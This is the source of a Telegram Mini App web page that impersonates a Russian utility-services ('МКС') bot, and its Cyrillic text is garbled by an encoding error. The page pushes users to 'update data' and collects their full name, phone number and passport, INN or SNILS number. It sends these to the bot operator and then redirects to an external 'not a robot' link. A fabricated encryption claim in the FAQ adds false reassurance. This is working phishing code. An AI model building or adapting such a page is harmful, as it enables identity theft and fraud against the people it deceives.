<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ú–ö–° Mini App</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: var(--tg-theme-bg-color, #ffffff);
            color: var(--tg-theme-text-color, #000000);
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }
        h1 {
            color: var(--tg-theme-link-color, #007bff);
            text-align: center;
        }
        .menu {
            display: flex;
            flex-direction: column;
            width: 100%;
            max-width: 400px;
        }
        .button {
            background-color: var(--tg-theme-button-color, #007bff);
            color: var(--tg-theme-button-text-color, #ffffff);
            border: none;
            padding: 15px;
            margin: 10px 0;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            text-align: center;
            transition: background-color 0.3s;
        }
        .button:hover {
            background-color: var(--tg-theme-secondary-bg-color, #0056b3);
        }
        .input {
            width: 100%;
            max-width: 400px;
            padding: 15px;
            margin: 10px 0;
            border-radius: 8px;
            border: 1px solid var(--tg-theme-hint-color, #cccccc);
            font-size: 16px;
            background-color: var(--tg-theme-bg-color, #ffffff);
            color: var(--tg-theme-text-color, #000000);
        }
        .error {
            color: red;
            margin: 10px 0;
            text-align: center;
        }
        .faq-item {
            margin: 10px 0;
        }
        .back-button {
            background-color: var(--tg-theme-secondary-bg-color, #6c757d);
            color: #ffffff;
        }
        .container {
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        .inline-button {
            background-color: #28a745;
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            text-decoration: none;
            display: inline-block;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div id="app" class="container"></div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();

        // –°–æ—Å—Ç–æ—è–Ω–∏—è –∫–∞–∫ –≤ FSM
        const states = {
            MAIN: 'main',
            FULLNAME: 'fullname',
            PHONE: 'phone',
            DOCUMENT_TYPE: 'document_type',
            DOCUMENT_NUMBER: 'document_number',
            ADDITIONAL_SERVICES: 'additional_services',
            FAQ: 'faq',
            INSTRUCTION: 'instruction',
            SUPPORT: 'support'
        };

        let currentState = states.MAIN;
        let formData = {
            fullname: '',
            phone: '',
            document_type: '',
            document_number: ''
        };

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Ä–µ–Ω–¥–µ—Ä–∏–Ω–≥–∞ –∫–æ–Ω—Ç–µ–Ω—Ç–∞
        function render() {
            const app = document.getElementById('app');
            app.innerHTML = '';

            if (currentState === states.MAIN) {
                app.innerHTML = `
                    <h1>üè† –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –ú–ö–°-–±–æ—Ç! üíß</h1>
                    <p>–£–ø—Ä–∞–≤–ª—è–π—Ç–µ —Å–≤–æ–∏–º–∏ —É—Å–ª—É–≥–∞–º–∏ –ª–µ–≥–∫–æ –∏ –±—ã—Å—Ç—Ä–æ! ‚ú®</p>
                `;
                createButton('üìù –û–±–Ω–æ–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ', () => { currentState = states.FULLNAME; render(); });
                createButton('üîÑ –ü–æ–º–µ–Ω—è—Ç—å —Ç–∞—Ä–∏—Ñ', handleUnauthorized);
                createButton('üí≥ –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –±–∞–ª–∞–Ω—Å', handleUnauthorized);
                createButton('üí∏ –ü–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å', handleUnauthorized);
                createButton('üõ†Ô∏è –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —É—Å–ª—É–≥–∏', () => { currentState = states.ADDITIONAL_SERVICES; render(); });
            } else if (currentState === states.FULLNAME) {
                app.innerHTML = `
                    <h1>üìù –û–±–Ω–æ–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ</h1>
                    <p><b>–£–ö–ê–ó–´–í–ê–ô–¢–ï –¢–û–õ–¨–ö–û –°–í–û–ò –î–ê–ù–ù–´–ï</b></p>
                    <p>üë§ –£–∫–∞–∂–∏—Ç–µ –§–∞–º–∏–ª–∏—é –ò–º—è –û—Ç—á–µ—Å—Ç–≤–æ –ø–æ–ª–Ω–æ—Å—Ç—å—é (—Ç–æ–ª—å–∫–æ —Ç–µ–∫—Å—Ç): üåü</p>
                    <input id="fullnameInput" class="input" type="text" placeholder="–§–∞–º–∏–ª–∏—è –ò–º—è –û—Ç—á–µ—Å—Ç–≤–æ">
                    <div id="error" class="error"></div>
                `;
                createButton('‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥', () => { currentState = states.MAIN; render(); }, 'back-button');
                createButton('–î–∞–ª–µ–µ', handleFullname);
            } else if (currentState === states.PHONE) {
                app.innerHTML = `
                    <h1>üìù –û–±–Ω–æ–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ</h1>
                    <p><b>–£–ö–ê–ó–´–í–ê–ô–¢–ï –¢–û–õ–¨–ö–û –°–í–û–ò –î–ê–ù–ù–´–ï</b></p>
                    <p>üìû –û—Ç–ø—Ä–∞–≤—å—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ (–Ω–∞—á–Ω–∏—Ç–µ —Å +7 –∏–ª–∏ 7, –Ω–∞–ø—Ä–∏–º–µ—Ä: +79991234567): üíß</p>
                    <input id="phoneInput" class="input" type="text" placeholder="+79991234567">
                    <div id="error" class="error"></div>
                `;
                createButton('‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥', () => { currentState = states.FULLNAME; render(); }, 'back-button');
                createButton('–î–∞–ª–µ–µ', handlePhone);
            } else if (currentState === states.DOCUMENT_TYPE) {
                app.innerHTML = `
                    <h1>üìù –û–±–Ω–æ–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ</h1>
                    <p>–í—ã–±–µ—Ä–∏—Ç–µ –¥–æ–∫—É–º–µ–Ω—Ç: üåü</p>
                `;
                createButton('üìÑ –ü–∞—Å–ø–æ—Ä—Ç', () => { formData.document_type = '–ü–∞—Å–ø–æ—Ä—Ç'; currentState = states.DOCUMENT_NUMBER; render(); });
                createButton('üßæ –ò–ù–ù', () => { formData.document_type = '–ò–ù–ù'; currentState = states.DOCUMENT_NUMBER; render(); });
                createButton('üü¢ –°–ù–ò–õ–°', () => { formData.document_type = '–°–ù–ò–õ–°'; currentState = states.DOCUMENT_NUMBER; render(); });
                createButton('‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥', () => { currentState = states.PHONE; render(); }, 'back-button');
            } else if (currentState === states.DOCUMENT_NUMBER) {
                let placeholder = '';
                if (formData.document_type === '–ü–∞—Å–ø–æ—Ä—Ç') placeholder = '4510 123456';
                else if (formData.document_type === '–ò–ù–ù') placeholder = '500100732259';
                else if (formData.document_type === '–°–ù–ò–õ–°') placeholder = '112-233-445 95';

                app.innerHTML = `
                    <h1>üìù –û–±–Ω–æ–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ</h1>
                    <p><b>–£–ö–ê–ó–´–í–ê–ô–¢–ï –¢–û–õ–¨–ö–û –°–í–û–ò –î–ê–ù–ù–´–ï</b></p>
                    <p>–í–≤–µ–¥–∏—Ç–µ ${formData.document_type} (–ø—Ä–∏–º–µ—Ä: ${placeholder}): üåü</p>
                    <input id="docNumberInput" class="input" type="text" placeholder="${placeholder}">
                    <div id="error" class="error"></div>
                `;
                createButton('‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥', () => { currentState = states.DOCUMENT_TYPE; render(); }, 'back-button');
                createButton('–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å', handleDocumentNumber);
            } else if (currentState === states.ADDITIONAL_SERVICES) {
                app.innerHTML = `
                    <h1>üõ†Ô∏è –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —É—Å–ª—É–≥–∏</h1>
                    <p>–í—ã–±–µ—Ä–∏—Ç–µ –æ–ø—Ü–∏—é: üåü</p>
                `;
                createButton('‚ùì –ß–∞—Å—Ç–æ –∑–∞–¥–∞–≤–∞–µ–º—ã–µ –≤–æ–ø—Ä–æ—Å—ã', () => { currentState = states.FAQ; render(); });
                createButton('‚ÑπÔ∏è –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è', () => { currentState = states.INSTRUCTION; render(); });
                createButton('üìû –°–≤—è–∑–∞—Ç—å—Å—è —Å —Ç–µ—Ö–ø–æ–¥–¥–µ—Ä–∂–∫–æ–π', () => { currentState = states.SUPPORT; render(); });
                createButton('‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥', () => { currentState = states.MAIN; render(); }, 'back-button');
            } else if (currentState === states.FAQ) {
                app.innerHTML = `
                    <h1>‚ùì –ß–∞—Å—Ç–æ –∑–∞–¥–∞–≤–∞–µ–º—ã–µ –≤–æ–ø—Ä–æ—Å—ã</h1>
                `;
                createFAQButton('‚è≥ –î–æ –∫–∞–∫–æ–≥–æ —á–∏—Å–ª–∞ –Ω—É–∂–Ω–æ –ø–µ—Ä–µ–¥–∞–≤–∞—Ç—å –ø–æ–∫–∞–∑–∞–Ω–∏—è?', 'üìå –ü–æ–∫–∞–∑–∞–Ω–∏—è —Å—á–µ—Ç—á–∏–∫–æ–≤ –Ω—É–∂–Ω–æ –ø–µ—Ä–µ–¥–∞–≤–∞—Ç—å –¥–æ 25 —á–∏—Å–ª–∞ –∫–∞–∂–¥–æ–≥–æ –º–µ—Å—è—Ü–∞. üíß');
                createFAQButton('üí∏ –ß—Ç–æ –±—É–¥–µ—Ç, –µ—Å–ª–∏ –Ω–µ –ø–µ—Ä–µ–¥–∞—Ç—å –¥–∞–Ω–Ω—ã–µ –≤–æ–≤—Ä–µ–º—è?', '‚ö†Ô∏è –ü–ª–∞—Ç–∞ –±—É–¥–µ—Ç –Ω–∞—á–∏—Å–ª–µ–Ω–∞ –ø–æ —Å—Ä–µ–¥–Ω–µ–º—É ‚Äî –∏—Å—Ö–æ–¥—è –∏–∑ –ø–æ–∫–∞–∑–∞–Ω–∏–π –∑–∞ –ø–æ—Å–ª–µ–¥–Ω–∏–µ –ø–æ–ª–≥–æ–¥–∞. üî•');
                createFAQButton('üîí –≠—Ç–æ –±–µ–∑–æ–ø–∞—Å–Ω–æ?', 'üîê –î–∞, —É –Ω–∞—Å —Å—Ç–æ–∏—Ç –∑–∞—â–∏—Ç–∞ VISION 3.87676 PRO VS (—Å–∫–≤–æ–∑–Ω–æ–µ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ). ‚ú®');
                createFAQButton('‚ö°Ô∏è –ü–æ—á–µ–º—É —á–µ—Ä–µ–∑ Telegram?', '‚ö°Ô∏è –î–ª—è —É–¥–æ–±—Å—Ç–≤–∞ –∏ –ø–µ—Ä–µ—Ö–æ–¥ –Ω–∞ —Ü–∏—Ñ—Ä–æ–≤—ã–µ –ø–ª–æ—â–∞–¥–∫–∏. üíß');
                createFAQButton('üîÅ –ú–æ–∂–Ω–æ –ª–∏ –∏—Å–ø—Ä–∞–≤–∏—Ç—å –æ—à–∏–±–∫—É?', '‚úÖ –î–∞, –º–æ–∂–Ω–æ. –°–≤—è–∂–∏—Ç–µ—Å—å —Å —Ç–µ—Ö–ø–æ–¥–¥–µ—Ä–∂–∫–æ–π –∏–ª–∏ –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –≤–≤–æ–¥. üåü');
                createFAQButton('üìë –ö–∞–∫–∏–µ –¥–æ–∫—É–º–µ–Ω—Ç—ã –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å?', 'üëâ –ü–∞—Å–ø–æ—Ä—Ç, –ò–ù–ù, –°–ù–ò–õ–°. üíß');
                createButton('‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥', () => { currentState = states.ADDITIONAL_SERVICES; render(); }, 'back-button');
            } else if (currentState === states.INSTRUCTION) {
                app.innerHTML = `
                    <h1>‚ÑπÔ∏è –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è</h1>
                    <p>üìã –ß—Ç–æ–±—ã –æ–±–Ω–æ–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ:<br>
                    1Ô∏è‚É£ –ù–∞–∂–º–∏—Ç–µ ¬´–û–±–Ω–æ–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ¬ª.<br>
                    2Ô∏è‚É£ –û—Ç–ø—Ä–∞–≤—å—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞.<br>
                    3Ô∏è‚É£ –í—ã–±–µ—Ä–∏—Ç–µ –¥–æ–∫—É–º–µ–Ω—Ç –∏ –≤–≤–µ–¥–∏—Ç–µ –µ–≥–æ –Ω–æ–º–µ—Ä.<br>
                    4Ô∏è‚É£ –ü–æ–ª—É—á–∏—Ç–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ. ‚ú®<br><br>
                    –ù–∞ –ª—é–±–æ–º —ç—Ç–∞–ø–µ –≤—ã –º–æ–∂–µ—Ç–µ –Ω–∞–∂–∞—Ç—å '‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥'. üíß</p>
                `;
                createButton('‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥', () => { currentState = states.ADDITIONAL_SERVICES; render(); }, 'back-button');
            } else if (currentState === states.SUPPORT) {
                app.innerHTML = `
                    <h1>üìû –°–≤—è–∑–∞—Ç—å—Å—è —Å —Ç–µ—Ö–ø–æ–¥–¥–µ—Ä–∂–∫–æ–π</h1>
                    <p>üìû –î–ª—è —Å–≤—è–∑–∏ —Å —Ç–µ—Ö–ø–æ–¥–¥–µ—Ä–∂–∫–æ–π –Ω–∞–∂–º–∏—Ç–µ –Ω–∞ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ –∏–ª–∏ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Å—Å—ã–ª–∫—É –≤—Ä—É—á–Ω—É—é! ‚ú®</p>
                    <a href="https://t.me/MymtcSup" class="inline-button">üìû –ù–∞–ø–∏—Å–∞—Ç—å –≤ —Ç–µ—Ö–ø–æ–¥–¥–µ—Ä–∂–∫—É</a>
                `;
                createButton('‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥', () => { currentState = states.ADDITIONAL_SERVICES; render(); }, 'back-button');
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –∫–Ω–æ–ø–∫–∏
        function createButton(text, onClick, className = 'button') {
            const btn = document.createElement('button');
            btn.className = className;
            btn.textContent = text;
            btn.onclick = onClick;
            document.getElementById('app').appendChild(btn);
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è FAQ –∫–Ω–æ–ø–æ–∫ (–ø–æ–∫–∞–∑ –æ—Ç–≤–µ—Ç–∞ –ø–æ –∫–ª–∏–∫—É)
        function createFAQButton(question, answer) {
            const btn = document.createElement('button');
            btn.className = 'button faq-item';
            btn.textContent = question;
            btn.onclick = () => {
                const app = document.getElementById('app');
                const answerDiv = document.createElement('div');
                answerDiv.innerHTML = `<p>${answer}</p>`;
                app.appendChild(answerDiv);
                createButton('‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥', () => { currentState = states.FAQ; render(); }, 'back-button');
                btn.remove(); // –£–¥–∞–ª—è–µ–º –∫–Ω–æ–ø–∫—É –ø–æ—Å–ª–µ –∫–ª–∏–∫–∞, —á—Ç–æ–±—ã –ø–æ–∫–∞–∑–∞—Ç—å –æ—Ç–≤–µ—Ç
            };
            document.getElementById('app').appendChild(btn);
        }

        // –û–±—Ä–∞–±–æ—Ç–∫–∞ –Ω–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã—Ö –¥–µ–π—Å—Ç–≤–∏–π
        function handleUnauthorized() {
            const app = document.getElementById('app');
            app.innerHTML = `
                <h1>üîí –ù–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–æ</h1>
                <p>–ú—ã –Ω–µ –º–æ–∂–µ–º –≤—ã–ø–æ–ª–Ω–∏—Ç—å –¥–µ–π—Å—Ç–≤–∏–µ, –ø–æ—Ç–æ–º—É —á—Ç–æ –≤—ã –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–ª–∏—Å—å. üî•</p>
            `;
            createButton('üîê –ê–≤—Ç–æ—Ä–∏–∑–æ–≤–∞—Ç—å—Å—è', () => { currentState = states.FULLNAME; render(); });
            createButton('‚Ü©Ô∏è –°–º–µ–Ω–∏—Ç—å –¥–µ–π—Å—Ç–≤–∏–µ', () => { currentState = states.MAIN; render(); }, 'back-button');
        }

        // –í–∞–ª–∏–¥–∞—Ü–∏—è –∏ –æ–±—Ä–∞–±–æ—Ç–∫–∞ –§–ò–û
        function handleFullname() {
            const input = document.getElementById('fullnameInput').value.trim();
            const error = document.getElementById('error');
            if (!/^[–ê-–Ø–∞-—è–Å—ë\s-]+$/.test(input)) {
                error.textContent = '‚ùå –§–ò–û –¥–æ–ª–∂–Ω–æ —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ç–æ–ª—å–∫–æ –±—É–∫–≤—ã. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞. üî•';
                return;
            }
            formData.fullname = input.replace(/\s+/g, ' ');
            savePartial();
            currentState = states.PHONE;
            render();
        }

        // –í–∞–ª–∏–¥–∞—Ü–∏—è –∏ –æ–±—Ä–∞–±–æ—Ç–∫–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞
        function handlePhone() {
            const input = document.getElementById('phoneInput').value.trim();
            const error = document.getElementById('error');
            const digits = input.replace(/[^0-9]/g, '');
            if (!input.startsWith('+7') && !input.startsWith('7')) {
                error.textContent = '‚ùå –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –¥–æ–ª–∂–µ–Ω –Ω–∞—á–∏–Ω–∞—Ç—å—Å—è —Å +7 –∏–ª–∏ 7. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞. üî•';
                return;
            }
            if (digits.length < 10 || digits.length > 11) {
                error.textContent = '‚ùå –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å 10 –∏–ª–∏ 11 —Ü–∏—Ñ—Ä. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞. üî•';
                return;
            }
            formData.phone = input;
            savePartial();
            currentState = states.DOCUMENT_TYPE;
            render();
        }

        // –û–±—Ä–∞–±–æ—Ç–∫–∞ –Ω–æ–º–µ—Ä–∞ –¥–æ–∫—É–º–µ–Ω—Ç–∞
        function handleDocumentNumber() {
            const input = document.getElementById('docNumberInput').value.trim();
            const error = document.getElementById('error');
            if (!input) {
                error.textContent = '‚ùå –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞. üî•';
                return;
            }
            formData.document_number = input;
            savePartial(true);
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ
            const app = document.getElementById('app');
            app.innerHTML = `
                <h1>‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ</h1>
                <p>–î–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ —á—Ç–æ –≤—ã –Ω–µ —Ä–æ–±–æ—Ç! ‚ú®</p>
                <a href="https://redirect.figma.site/" class="inline-button">‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å, —á—Ç–æ –Ω–µ —Ä–æ–±–æ—Ç</a>
            `;
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –±–æ—Ç—É
            const dataToSend = JSON.stringify(formData);
            tg.sendData(dataToSend); // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –±–æ—Ç—É –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ (–±–æ—Ç –¥–æ–ª–∂–µ–Ω –∏–º–µ—Ç—å –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ onWebAppData)
            createButton('‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –º–µ–Ω—é', () => { resetForm(); currentState = states.MAIN; render(); }, 'back-button');
        }

        // –°–∏–º—É–ª—è—Ü–∏—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è (–≤ —Ä–µ–∞–ª—å–Ω–æ—Å—Ç–∏ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∏–ª–∏ –ª–æ–≥–∏—Ä–æ–≤–∞—Ç—å)
        function savePartial(isComplete = false) {
            console.log('–°–æ—Ö—Ä–∞–Ω–µ–Ω—ã –¥–∞–Ω–Ω—ã–µ:', formData); // –ó–¥–µ—Å—å –º–æ–∂–Ω–æ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–∞ —Å–µ—Ä–≤–µ—Ä —á–µ—Ä–µ–∑ fetch, –µ—Å–ª–∏ –µ—Å—Ç—å –±—ç–∫–µ–Ω–¥
            // –í –±–æ—Ç–µ —ç—Ç–æ —Å–æ—Ö—Ä–∞–Ω—è–ª–æ—Å—å –≤ —Ñ–∞–π–ª; –∑–¥–µ—Å—å –ª–æ–≥–∏—Ä—É–µ–º –∏–ª–∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º
        }

        function resetForm() {
            formData = { fullname: '', phone: '', document_type: '', document_number: '' };
        }

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
        render();
    </script>
</body>
</html>
